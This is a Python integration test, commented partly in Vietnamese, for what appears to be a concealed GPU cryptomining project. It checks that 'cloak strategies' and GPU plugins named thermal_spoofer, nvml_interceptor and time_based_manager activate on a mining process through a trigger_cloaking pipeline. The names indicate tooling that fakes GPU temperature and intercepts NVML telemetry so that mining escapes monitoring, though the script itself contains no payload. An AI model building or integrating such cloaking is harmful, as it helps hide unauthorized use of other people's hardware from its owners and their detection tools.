#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Test GPU Plugins Integration
Kiểm tra gpu_plugins đã được tích hợp đúng vào pipeline chưa
"""

import sys
import os
import logging
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, '/app/mining_environment/scripts')
sys.path.insert(0, '/app/mining_environment')

# Setup logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def test_gpu_plugins_import():
    """Test 1: Kiểm tra import gpu_plugins"""
    logger.info("=" * 60)
    logger.info("TEST 1: Import gpu_plugins module")
    logger.info("=" * 60)
    
    try:
        import gpu_plugins
        logger.info("✅ Successfully imported gpu_plugins")
        
        # Check main function exists
        if hasattr(gpu_plugins, 'apply_gpu_strategies'):
            logger.info("✅ apply_gpu_strategies function exists")
        else:
            logger.error("❌ apply_gpu_strategies function not found")
            return False
            
        # Check registry
        if hasattr(gpu_plugins, 'gpu_plugin_registry'):
            registry = gpu_plugins.gpu_plugin_registry
            plugins = registry.list_plugins()
            logger.info(f"✅ GPU Plugin Registry has {len(plugins)} plugins: {plugins}")
        else:
            logger.warning("⚠️ gpu_plugin_registry not found")
            
        return True
        
    except ImportError as e:
        logger.error(f"❌ Failed to import gpu_plugins: {e}")
        return False

def test_pipeline_with_gpu_strategy():
    """Test 2: Kiểm tra pipeline với GPU strategy"""
    logger.info("=" * 60)
    logger.info("TEST 2: Pipeline with GPU Strategy")
    logger.info("=" * 60)
    
    try:
        # Fix imports by adding mining_environment to path
        import sys
        sys.path.insert(0, '/app')
        
        from mining_environment.scripts.resource_manager import ResourceManager
        from mining_environment.scripts.cloak_strategies import CloakCoordinator
        from mining_environment.scripts.utils import MiningProcess, CloakRequest
        
        # Create test process
        test_process = MiningProcess(
            pid=99999,  # Fake PID for testing
            name="test_mining_process"
        )
        logger.info(f"✅ Created test process: PID={test_process.pid}, Name={test_process.name}")
        
        # Initialize components
        rm = ResourceManager()
        logger.info("✅ ResourceManager initialized")
        
        # Test trigger_cloaking flow
        logger.info("🔄 Testing trigger_cloaking pipeline...")
        
        # This should now activate gpu_plugins when GPU strategy is applied
        result = rm.trigger_cloaking(test_process, source='test')
        
        if result:
            logger.info("✅ Pipeline executed successfully")
        else:
            logger.warning("⚠️ Pipeline returned False (might be expected for test PID)")
            
        return True
        
    except Exception as e:
        logger.error(f"❌ Pipeline test failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False

def test_gpu_strategy_plugin_activation():
    """Test 3: Test trực tiếp GPUCloakStrategy với plugin activation"""
    logger.info("=" * 60)
    logger.info("TEST 3: GPUCloakStrategy Plugin Activation")
    logger.info("=" * 60)
    
    try:
        from cloak_strategies import GPUCloakStrategy
        from utils import MiningProcess
        
        # Create test process
        test_process = MiningProcess(
            pid=88888,  # Fake PID for testing
            name="test_gpu_process"
        )
        
        # Create GPU strategy instance
        gpu_strategy = GPUCloakStrategy()
        logger.info("✅ GPUCloakStrategy instance created")
        
        # Check if _activate_gpu_plugins method exists
        if hasattr(gpu_strategy, '_activate_gpu_plugins'):
            logger.info("✅ _activate_gpu_plugins method exists")
            
            # Try to activate plugins
            plugin_result = gpu_strategy._activate_gpu_plugins(test_process.pid)
            
            if plugin_result:
                logger.info("✅ GPU plugins activated successfully!")
                logger.info("   • thermal_spoofer ✅")
                logger.info("   • nvml_interceptor ✅")
                logger.info("   • time_based_manager ✅")
            else:
                logger.warning("⚠️ GPU plugins activation returned False")
                logger.warning("   (This might be expected in test environment)")
        else:
            logger.error("❌ _activate_gpu_plugins method not found!")
            return False
            
        return True
        
    except Exception as e:
        logger.error(f"❌ GPU strategy test failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False

def main():
    """Main test runner"""
    logger.info("🚀 Starting GPU Plugins Integration Tests")
    logger.info("=" * 80)
    
    results = {
        'Test 1 - Import': test_gpu_plugins_import(),
        'Test 2 - Pipeline': test_pipeline_with_gpu_strategy(),
        'Test 3 - Plugin Activation': test_gpu_strategy_plugin_activation()
    }
    
    # Summary
    logger.info("=" * 80)
    logger.info("📊 TEST SUMMARY:")
    logger.info("=" * 80)
    
    for test_name, result in results.items():
        status = "✅ PASSED" if result else "❌ FAILED"
        logger.info(f"{test_name}: {status}")
    
    all_passed = all(results.values())
    
    if all_passed:
        logger.info("=" * 80)
        logger.info("🎉 ALL TESTS PASSED! GPU plugins are properly integrated!")
        logger.info("=" * 80)
    else:
        logger.error("=" * 80)
        logger.error("⚠️ SOME TESTS FAILED - Review integration")
        logger.error("=" * 80)
    
    return all_passed

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
